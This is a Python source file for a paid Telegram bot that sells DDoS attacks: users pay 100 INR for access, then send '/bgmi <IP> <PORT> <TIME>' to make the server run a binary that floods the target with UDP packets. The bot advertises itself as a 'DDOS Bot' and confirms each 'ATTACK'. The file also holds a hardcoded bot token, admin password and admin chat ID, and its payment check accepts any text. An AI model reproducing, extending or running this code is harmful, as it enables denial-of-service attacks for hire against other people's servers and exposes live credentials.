import logging
import socket
import qrcode
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, CallbackContext

# Bot Token from BotFather
BOT_TOKEN = "7736717674:AAEdPwD1eR62o5zupAKsy-cnhYJ3lLc_Zbw"

# Admin password for /pass command
ADMIN_PASSWORD = "TOXIC01BHAI"

# Payment details
PAYMENT_AMOUNT = 100  # 100 INR for 5 days access
PAYMENT_QR_CODE = "qr.png"  # QR code image file

# User access storage (in-memory, replace with a database for production)
user_access = {}
admin_users = set()

# Filters storage
filters_dict = {}

# Logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)


# Execute Binary to Send UDP Packets
def execute_binary(ip: str, port: int, time: int):
    try:
        command = ["./megoxer", ip, str(port), str(time)]
        subprocess.run(command, check=True)
        logger.info(f"Executed binary to send UDP packets to {ip}:{port} for {time} seconds")
    except Exception as e:
        logger.error(f"Error executing binary: {e}")

# Command Handlers
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("🚀 Welcome to the DDOS Bot! 🚀\n\n"
                                    "Use /bgmi to send DDOS ATTACK.\n"
                                    "Use /pay to get payment details.\n"
                                    "Use /help for more commands.")

async def bgmi(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in user_access:
        await update.message.reply_text("⚠️ You don't have access. Please pay ₹100 for 5 days access using /pay. CONTACT @TOXICPLAYER002")
        return

    try:
        ip, port, time = context.args
        port = int(port)
        time = int(time)
        execute_binary(ip, port, time)
        await update.message.reply_text(f"✅ ATTACK SUCCESUFFLY SENT to {ip}:{port} for {time} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Invalid arguments. Usage: /bgmi <IP> <PORT> <TIME>")

async def help(update: Update, context: CallbackContext):
    await update.message.reply_text("📜 Available Commands:\n\n"
                                    "/start - Start the bot\n"
                                    "/bgmi <IP> <PORT> <TIME> - Send UDP packets\n"
                                    "/pay - Pay ₹100 for 5 days access\n"
                                    "/help - Show this help message\n"
                                    "/pass <PASSWORD> - Admin access to add/remove users\n"
                                    "/set <FILTER> <MESSAGE> - Set a filter\n"
                                    "/trial - Request a trial")

async def pay(update: Update, context: CallbackContext):
    # Generate QR code
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(f"Pay ₹{PAYMENT_AMOUNT} for 5 days access.")
    qr.make(fit=True)
    img = qr.make_image(fill="black", back_color="white")
    img.save(PAYMENT_QR_CODE)

    # Send QR code and instructions
    await update.message.reply_photo(photo=open(PAYMENT_QR_CODE, "rb"))
    await update.message.reply_text(f"📲 Scan the QR code to pay ₹{PAYMENT_AMOUNT}.\n"
                                    "After payment, send the transaction ID here.")

async def handle_transaction_id(update: Update, context: CallbackContext):
    transaction_id = update.message.text
    user_id = update.message.from_user.id

    # Simulate payment verification (replace with actual payment gateway integration)
    if transaction_id.strip():
        user_access[user_id] = True
        await update.message.reply_text("✅ Payment verified! You now have 5 days access.")
    else:
        await update.message.reply_text("❌ Invalid transaction ID. Please try again.")

async def pass_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    try:
        password = context.args[0]
        if password == ADMIN_PASSWORD:
            admin_users.add(user_id)
            await update.message.reply_text("🔓 Admin access granted!")
        else:
            await update.message.reply_text("❌ Incorrect password.")
    except IndexError:
        await update.message.reply_text("❌ Usage: /pass <PASSWORD>")

async def add_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_users:
        await update.message.reply_text("❌ You don't have admin access.")
        return

    try:
        target_user_id = int(context.args[0])
        user_access[target_user_id] = True
        await update.message.reply_text(f"✅ User {target_user_id} added.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /add <USER_ID>")

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_users:
        await update.message.reply_text("❌ You don't have admin access.")
        return

    try:
        target_user_id = int(context.args[0])
        if target_user_id in user_access:
            del user_access[target_user_id]
            await update.message.reply_text(f"✅ User {target_user_id} removed.")
        else:
            await update.message.reply_text("❌ User not found.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: /remove <USER_ID>")

async def set_filter(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_users:
        await update.message.reply_text("❌ You don't have admin access.")
        return

    try:
        filter_name, *message_parts = context.args
        message = " ".join(message_parts)
        filters_dict[filter_name] = message
        await update.message.reply_text(f"✅ Filter '{filter_name}' set to: {message}")
    except IndexError:
        await update.message.reply_text("❌ Usage: /set <FILTER> <MESSAGE>")

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    text = update.message.text.lower()

    # Check for filters
    for filter_name, message in filters_dict.items():
        if filter_name in text:
            await update.message.reply_text(message)

async def trial(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    username = update.message.from_user.username

    # Send trial request to admin
    admin_message = f"🚨 Trial Request 🚨\n\nUsername: @{username}\nUser ID: {user_id}\n\nRequirements: USER REQUIREMENTS FOR TRIAL"
    await context.bot.send_message(chat_id="6882674372", text=admin_message)
    await update.message.reply_text("✅ Your trial request has been sent to the admin. Please wait for approval.")

# Main function
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("pass", pass_admin))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("set", set_filter))
    application.add_handler(CommandHandler("trial", trial))

    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_transaction_id))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":

    main()